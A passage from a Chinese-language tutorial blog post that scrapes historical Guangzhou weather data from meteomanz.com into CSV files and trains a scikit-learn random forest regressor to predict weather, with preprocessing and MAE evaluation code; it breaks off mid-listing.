写csv</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">years, b, c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param years: [开始日期距离现在的年份, 结束日期距离现在的年份]</span></span><br><span class="line"><span class="string">    :param b: [开始日期距离现在日期的天数, 结束日期距离现在日期的天数]</span></span><br><span class="line"><span class="string">    :param c: csv文件名</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 1. 创建文件对象</span></span><br><span class="line">    f = <span class="built_in">open</span>(c, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, newline=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 基于文件对象构建 csv写入对象</span></span><br><span class="line">    csv_writer = csv.writer(f)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 构建列表头</span></span><br><span class="line">    <span class="comment"># , &quot;negAve&quot;, &quot;negMax&quot;, &quot;negMin&quot;</span></span><br><span class="line">    csv_writer.writerow([<span class="string">&quot;Time&quot;</span>, <span class="string">&quot;Ave_t&quot;</span>, <span class="string">&quot;Max_t&quot;</span>, <span class="string">&quot;Min_t&quot;</span>, <span class="string">&quot;Prec&quot;</span>, <span class="string">&quot;SLpress&quot;</span>, <span class="string">&quot;Winddir&quot;</span>, <span class="string">&quot;Windsp&quot;</span>, <span class="string">&quot;Cloud&quot;</span>])</span><br><span class="line">    <span class="comment"># 取现在日期</span></span><br><span class="line">    today = DT.datetime.now()</span><br><span class="line">    <span class="comment"># 取20天前日期</span></span><br><span class="line">    week_ago = (today - DT.timedelta(days=b[<span class="number">0</span>])).date()</span><br><span class="line">    <span class="comment"># 20天后</span></span><br><span class="line">    week_pre = (today + DT.timedelta(days=b[<span class="number">1</span>])).date()</span><br><span class="line">    <span class="comment"># 城市id 广州59287 青岛 54857</span></span><br><span class="line">    <span class="built_in">id</span> = <span class="string">&quot;59287&quot;</span></span><br><span class="line">    <span class="comment"># 爬取数据链接</span></span><br><span class="line">    url = <span class="string">&quot;http://www.meteomanz.com/sy2?l=1&amp;cou=2250&amp;ind=&quot;</span> + <span class="built_in">id</span> + <span class="string">&quot;&amp;d1=&quot;</span> + <span class="built_in">str</span>(week_ago.day).zfill(<span class="number">2</span>) + <span class="string">&quot;&amp;m1=&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">        week_ago.month).zfill(<span class="number">2</span>) + <span class="string">&quot;&amp;y1=&quot;</span> + <span class="built_in">str</span>(week_ago.year - years[<span class="number">0</span>]) + <span class="string">&quot;&amp;d2=&quot;</span> + <span class="built_in">str</span>(week_pre.day).zfill(</span><br><span class="line">        <span class="number">2</span>) + <span class="string">&quot;&amp;m2=&quot;</span> + <span class="built_in">str</span>(week_pre.month).zfill(<span class="number">2</span>) + <span class="string">&quot;&amp;y2=&quot;</span> + <span class="built_in">str</span>(week_pre.year - years[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 显示获取数据集的网址</span></span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    g = GetData(url).Get()</span><br><span class="line">    <span class="comment"># beautifulsoup解析网页</span></span><br><span class="line">    soup = BeautifulSoup(g, <span class="string">&quot;html5lib&quot;</span>)</span><br><span class="line">    <span class="comment"># 取&lt;tbody&gt;内容</span></span><br><span class="line">    tb = soup.find(name=<span class="string">&quot;tbody&quot;</span>)</span><br><span class="line">    <span class="comment"># 取tr内容</span></span><br><span class="line">    past_tr = tb.find_all(name=<span class="string">&quot;tr&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> past_tr:</span><br><span class="line">        <span class="comment"># 取tr内每个td的内容</span></span><br><span class="line">        text = tr.find_all(name=<span class="string">&quot;td&quot;</span>)</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        negA = negMax = negMin = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(text)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                text[i] = text[i].a.string</span><br><span class="line">                <span class="comment"># 网站bug，会给每个月第0天，比如 00/11/2020,所以要drop掉</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;00/&quot;</span> <span class="keyword">in</span> text[i]:</span><br><span class="line">                    flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">8</span>:</span><br><span class="line">                <span class="comment"># 把/8去掉，网页显示的格式</span></span><br><span class="line">                text[i] = text[i].string.replace(<span class="string">&quot;/8&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">5</span>:</span><br><span class="line">                <span class="comment"># 去掉单位</span></span><br><span class="line">                text[i] = text[i].string.replace(<span class="string">&quot; Hpa&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> i == <span class="number">6</span>:</span><br><span class="line">                <span class="comment"># 去掉风力里括号内的内容</span></span><br><span class="line">                text[i] = re.sub(<span class="string">u&quot;[º(.*?|N|W|E|S)]&quot;</span>, <span class="string">&quot;&quot;</span>, text[i].string)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 取每个元素的内容</span></span><br><span class="line">                text[i] = text[i].string</span><br><span class="line">            <span class="comment"># 丢失数据都取2(简陋做法)</span></span><br><span class="line">            <span class="comment"># 这么做 MAE=3.6021</span></span><br><span class="line">            text[i] = <span class="string">&quot;2&quot;</span> <span class="keyword">if</span> text[i] == <span class="string">&quot;-&quot;</span> <span class="keyword">else</span> text[i]</span><br><span class="line">            text[i] = <span class="string">&quot;2&quot;</span> <span class="keyword">if</span> text[i] == <span class="string">&quot;Tr&quot;</span> <span class="keyword">else</span> text[i]</span><br><span class="line">        text = text[<span class="number">0</span>:<span class="number">9</span>]</span><br><span class="line">        <span class="comment"># ext += [str(int(negA)), str(int(negMax)), str(int(negMin))]</span></span><br><span class="line">        <span class="comment"># 4. 写入csv文件内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">            csv_writer.writerow(text)</span><br><span class="line">    <span class="comment"># 5. 关闭文件</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>GetData.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: GetData.py</span></span><br><span class="line"><span class="comment"># 功能: 爬取数据</span></span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GetData</span>:</span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    headers = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url, header=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :param url: 获取的网址</span></span><br><span class="line"><span class="string">        :param header: 请求头，默认已内置</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="keyword">if</span> header == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            self.headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&#x27;</span></span><br><span class="line">                          <span class="string">&#x27;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, &#x27;</span></span><br><span class="line">                              <span class="string">&#x27;like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36 &#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.meteomanz.com&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.headers = header</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :return: 网址对应的网页内容</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        http = urllib3.PoolManager()</span><br><span class="line">        <span class="keyword">return</span> http.request(<span class="string">&#x27;GET&#x27;</span>, self.url, headers=self.headers).data</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>到时候就可以直接用一行命令取得天气数据了，如下面是取去年今日的20天到去年今日的天气数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用近几年的数据做训练集</span></span><br><span class="line">   <span class="comment"># 如 [1,1], [20, 0]就是用2019年的今天的20天前到2019年的今天数据做训练集</span></span><br><span class="line">   <span class="comment"># 写入csv</span></span><br><span class="line">   Write([<span class="number">1</span>, <span class="number">1</span>], [<span class="number">20</span>, <span class="number">0</span>], <span class="string">&quot;weather_train_train.csv&quot;</span>)</span><br></pre></td></tr></table></figure><p>结果如下<br><code>weather_train_train.csv</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Time,Ave_t,Max_t,Min_t,Prec,SLpress,Winddir,Windsp,Cloud</span><br><span class="line"></span><br><span class="line">07/12/2019,14.8,20.8,8.8,0.0,1026.3,331,11,0</span><br><span class="line">06/12/2019,15.2,19.8,10.7,0.0,1026.6,344,15,0</span><br><span class="line">05/12/2019,14.5,20.4,8.6,2,1026.2,346,13,8</span><br><span class="line">04/12/2019,13.8,20.4,7.1,0.0,1024.7,335,16,2</span><br><span class="line">03/12/2019,13.0,18.9,7.1,0.0,1024.8,330,10,0</span><br><span class="line">02/12/2019,18.2,24.9,11.5,0.0,1024.8,347,18,3</span><br><span class="line">01/12/2019,18.1,24.9,11.4,0.0,1020.9,332,16,1</span><br><span class="line">30/11/2019,17.5,23.6,11.4,0.0,1020.5,352,8,3</span><br><span class="line">29/11/2019,15.8,20.1,11.5,0.0,1023.6,349,11,4</span><br><span class="line">28/11/2019,20.4,27.1,13.8,0.0,1024.5,337,19,3</span><br><span class="line">27/11/2019,21.9,27.1,16.6,0.0,1021.3,336,12,0</span><br><span class="line">26/11/2019,22.2,28.4,16.1,0.0,1021.1,356,6,6</span><br><span class="line">25/11/2019,22.2,29.3,15.2,0.0,1020.8,344,13,3</span><br><span class="line">24/11/2019,21.4,29.3,13.6,0.0,1018.5,346,5,0</span><br><span class="line">23/11/2019,20.7,28.4,13.0,0.0,1017.2,352,5,1</span><br><span class="line">22/11/2019,19.6,27.6,11.6,0.0,1017.3,331,6,0</span><br><span class="line">21/11/2019,18.4,25.1,11.6,0.0,1019.1,323,9,1</span><br><span class="line">20/11/2019,18.3,24.2,12.4,0.0,1020.3,338,7,0</span><br><span class="line">19/11/2019,19.1,25.4,12.8,0.0,1020.5,342,11,0</span><br><span class="line">18/11/2019,22.2,28.8,15.7,0.0,1018.8,342,17,0</span><br><span class="line">17/11/2019,22.2,28.8,15.7,0.0,1015.2,358,7,3</span><br></pre></td></tr></table></figure><h2 id="6-数据预处理"><a href="#6-数据预处理" class="headerlink" title="6.数据预处理"></a>6.数据预处理</h2><p>如果在把上面的数据作为数据集训练，我们还需要做些数据的预处理，因为有些情况下我们得到的数据会有残缺，这种情况我们就要选择抛弃那一列或者用方差或其他什么的方法填充缺少的数据。</p><p>因为在我已经决定把数据里丢失的项全部取2了，所以下面我会列出可能的解决方法而不使用。</p><p>新建个<code>ProcessData.py</code>里建立<code>ProcessData</code>方法以获得数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: ProcessData.py</span></span><br><span class="line"><span class="keyword">from</span> Write <span class="keyword">import</span> Write</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.impute <span class="keyword">import</span> SimpleImputer</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 功能: 数据预处理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ProcessData</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        [X_train X训练数据集,</span></span><br><span class="line"><span class="string">        X_valid X训练数据集的验证集,</span></span><br><span class="line"><span class="string">        y_train Y训练数据集,</span></span><br><span class="line"><span class="string">        y_valid Y训练数据集的验证集,</span></span><br><span class="line"><span class="string">        imputed_X_test 预测数据集]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 用近几年的数据做训练集</span></span><br><span class="line">    <span class="comment"># 如 [1,1], [20, 0]就是用2019年的今天的20天前到2019年的今天数据做训练集</span></span><br><span class="line">    <span class="comment"># 写入csv</span></span><br><span class="line">    Write([<span class="number">1</span>, <span class="number">1</span>], [<span class="number">20</span>, <span class="number">0</span>], <span class="string">&quot;weather_train_train.csv&quot;</span>)</span><br><span class="line">    Write([<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">20</span>], <span class="string">&quot;weather_train_valid.csv&quot;</span>)</span><br><span class="line">    Write([<span class="number">0</span>, <span class="number">0</span>], [<span class="number">20</span>, <span class="number">0</span>], <span class="string">&quot;weather_test.csv&quot;</span>)</span><br><span class="line">    X_test = pd.read_csv(<span class="string">&quot;weather_test.csv&quot;</span>, index_col=<span class="string">&quot;Time&quot;</span>, parse_dates=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 读取测试集和验证集</span></span><br><span class="line">    X = pd.read_csv(<span class="string">&quot;weather_train_train.csv&quot;</span>, index_col=<span class="string">&quot;Time&quot;</span>, parse_dates=<span class="literal">True</span>)</span><br><span class="line">    y = pd.read_csv(<span class="string">&quot;weather_train_valid.csv&quot;</span>, index_col=<span class="string">&quot;Time&quot;</span>, parse_dates=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 把全部丢失的数据都drop，MAE=3.7又高了，所以去掉了</span></span><br><span class="line">    <span class="comment"># dxtcol = [col for col in X_test.columns</span></span><br><span class="line">    <span class="comment">#           if X_test[col].isnull().all()]</span></span><br><span class="line">    <span class="comment"># dxcol = [col for col in X.columns</span></span><br><span class="line">    <span class="comment">#          if X[col].isnull().all()]</span></span><br><span class="line">    <span class="comment"># dycol = [col for col in y.columns</span></span><br><span class="line">    <span class="comment">#          if y[col].isnull().all()]</span></span><br><span class="line">    <span class="comment"># for a1 in [dxtcol, dxcol, dycol]:</span></span><br><span class="line">    <span class="comment">#     for a2 in a1:</span></span><br><span class="line">    <span class="comment">#         if a2 in X_test.columns:</span></span><br><span class="line">    <span class="comment">#             X_test = X_test.drop(a2, axis=1)</span></span><br><span class="line">    <span class="comment">#         if a2 in X.columns:</span></span><br><span class="line">    <span class="comment">#             X = X.drop(a2, axis=1)</span></span><br><span class="line">    <span class="comment">#         if a2 in y.columns:</span></span><br><span class="line">    <span class="comment">#             y = y.drop(a2, axis=1)</span></span><br><span class="line">    <span class="comment"># 数据归一化和标准化，无法还原不用</span></span><br><span class="line">    <span class="comment"># scaler = preprocessing.StandardScaler()</span></span><br><span class="line">    <span class="comment"># pars = [cols for cols in X.columns if cols != &quot;Time&quot;]</span></span><br><span class="line">    <span class="comment"># for data in [X, y, X_test]:</span></span><br><span class="line">    <span class="comment">#     for par in pars:</span></span><br><span class="line">    <span class="comment">#         data[par] = scaler.fit_transform(data[par].values.reshape(-1, 1))</span></span><br><span class="line">    <span class="comment">#         # temp = scaler.fit(data[par].values.reshape(-1, 1))</span></span><br><span class="line">    <span class="comment">#         # data[par] = scaler.fit_transform(data[par].values.reshape(-1, 1), temp)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充缺少的数值用方差，不清楚效果如何</span></span><br><span class="line">    my_imputer = SimpleImputer()</span><br><span class="line">    X_train, X_valid, y_train, y_valid = train_test_split(X, y, train_size=<span class="number">0.8</span>, test_size=<span class="number">0.2</span>, random_state=<span class="number">0</span>)</span><br><span class="line">    imputed_X_train = pd.DataFrame(my_imputer.fit_transform(X_train))</span><br><span class="line">    imputed_X_valid = pd.DataFrame(my_imputer.transform(X_valid))</span><br><span class="line">    imputed_X_train.columns = X_train.columns</span><br><span class="line">    imputed_X_valid.columns = X_valid.columns</span><br><span class="line">    imputed_y_train = pd.DataFrame(my_imputer.fit_transform(y_train))</span><br><span class="line">    imputed_y_valid = pd.DataFrame(my_imputer.transform(y_valid))</span><br><span class="line">    imputed_y_train.columns = y_train.columns</span><br><span class="line">    imputed_y_valid.columns = y_valid.columns</span><br><span class="line">    imputed_X_test = pd.DataFrame(my_imputer.fit_transform(X_test))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 画折线图</span></span><br><span class="line">    <span class="comment"># sns.lineplot(data=X)</span></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    <span class="comment"># sns.lineplot(data=y)</span></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    <span class="comment"># sns.lineplot(data=X_test)</span></span><br><span class="line">    <span class="comment"># plt.show()</span></span><br><span class="line">    <span class="comment"># 返回分割后的数据集</span></span><br><span class="line">    <span class="keyword">return</span> [imputed_X_train, imputed_X_valid, imputed_y_train, imputed_y_valid, imputed_X_test]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-建立模型"><a href="#7-建立模型" class="headerlink" title="7.建立模型"></a>7.建立模型</h2><h3 id="7-1准备"><a href="#7-1准备" class="headerlink" title="7.1准备"></a>7.1准备</h3><h4 id="7-1-1-引入所需要的头文件"><a href="#7-1-1-引入所需要的头文件" class="headerlink" title="7.1.1 引入所需要的头文件"></a>7.1.1 引入所需要的头文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor <span class="comment"># 随机树森林模型</span></span><br><span class="line"><span class="keyword">import</span> joblib <span class="comment"># 保存模型为pkl</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error <span class="comment"># MAE评估方法</span></span><br><span class="line"><span class="keyword">from</span> ProcessData <span class="keyword">import</span> ProcessData <span class="comment"># 取数据</span></span><br></pre></td></tr></table></figure><h4 id="7-1-2-选择模型"><a href="#7-1-2-选择模型" class="headerlink" title="7.1.2 选择模型"></a>7.1.2 选择模型</h4><p>首先我们先要从模型里选择一项适合这次场景的模型，比如从决策树，随机树森林，RGB模型等等中选择，本处选用的随机树森林也就是RandomForest</p><h4 id="7-1-3-选择评估方法"><a href="#7-1-3-选择评估方法" class="headerlink" title="7.1.3 选择评估方法"></a>7.1.3 选择评估方法</h4><p>目前有许多的模型准确率评估方法，本处使用的是MAE，也就是mean_absolute_error 平均错误数值，就每个预测的数值离正确数值错误数值的平均数</p><h4 id="7-1-4-获取数据集"><a href="#7-1-4-获取数据集" class="headerlink" title="7.1.4 获取数据集"></a>7.1.4 获取数据集</h4><p>这次可以从<code>ProcessData()</code>获取到全部的被预处理后的数据，如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 取到数据</span></span><br><span class="line">    [X_train, X_valid, y_train, y_valid, X_test] = ProcessData()</span><br></pre></td></tr></table></figure><h3 id="7-2建立模型"><a href="#7-2建立模型" class="headerlink" title="7.2建立模型"></a>7.2建立模型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用XGB模型，不过用有bug</span></span><br><span class="line">   <span class="comment"># modelX = XGBRegressor(n_estimators=1000, learning_rate=0.05, random_state=0, n_jobs=4)</span></span><br><span class="line">   <span class="comment"># # model.fit(X_train_3, y_train_3)</span></span><br><span class="line">   <span class="comment"># # model.fit(X_train_2, y_train_2)</span></span><br><span class="line">   <span class="comment"># col = [&quot;Ave_t&quot;, &quot;Max_t&quot;, &quot;Min_t&quot;, &quot;Prec&quot;,&quot;SLpress&quot;, &quot;Winddir&quot;, &quot;Windsp&quot;, &quot;Cloud&quot;]</span></span><br><span class="line">   <span class="comment"># modelX.fit(X_train, y_train,</span></span><br><span class="line">   <span class="comment">#           early_stopping_rounds=5,</span></span><br><span class="line">   <span class="comment">#           eval_set=[(X_valid, y_valid)],</span></span><br><span class="line">   <span class="comment">#           verbose=False)</span></span><br><span class="line">   <span class="comment"># 随机树森林模型</span></span><br><span class="line">   model = RandomForestRegressor(random_state=<span class="number">0</span>, n_estimators=<span class="number">1001</span>)</span><br><span class="line">   <span class="comment"># 训练模型</span></span><br><span class="line">   model.fit(X_train, y_train)</span><br></pre></td></tr></table></figure><p>其中n_estimators是可自己选的，不过在多次调试后得到1001是MAE最优</p><h3 id="7-3-获取模型评估结果"><a href="#7-3-获取模型评估结果" class="headerlink" title="7.3 获取模型评估结果"></a>7.3 获取模型评估结果</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用MAE评估</span></span><br><span class="line">   score = mean_absolute_error(y_valid, preds)</span><br></pre></td></tr></table></figure><h3 id="7-4-用joblib模块保存模型"><a href="#7-4-用joblib模块保存模型" class="headerlink" title="7.4 用joblib模块保存模型"></a>7.4 用joblib模块保存模型</h3><p>保存后的模型便于传播即可多次使用，但当前环境下的需求不大但我还是写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 保存模型到本地</span></span><br><span class="line">joblib.dump(model, a)</span><br></pre></td></tr></table></figure><h3 id="7-5-封装"><a href="#7-5-封装" class="headerlink" title="7.5 封装"></a>7.5 封装</h3><p><code>GetModel.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2020/12/16</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: GetModel.py</span></span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor</span><br><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error</span><br><span class="line"><span class="keyword">from</span> ProcessData <span class="keyword">import</span> ProcessData</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 训练并保存模型</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetModel</span>(<span class="params">a=<span class="string">&quot;Model.pkl&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param a: 模型文件名</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">        [socre: MAE评估结果,</span></span><br><span class="line"><span class="string">        X_test: 预测数据集]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 取到数据</span></span><br><span class="line">    [X_train, X_valid, y_train, y_valid, X_test] = ProcessData()</span><br><span class="line">    <span class="comment"># 用XGB模型，不过用有bug</span></span><br><span class="line">    <span class="comment"># modelX = XGBRegressor(n_estimators=1000, learning_rate=0.05, random_state=0, n_jobs=4)</span></span><br><span class="line">    <span class="comment"># # model.fit(X_train_3, y_train_3)</span></span><br><span class="line">    <span class="comment"># # model.fit(X_train_2, y_train_2)</span></span><br><span class="line">    <span class="comment"># col = 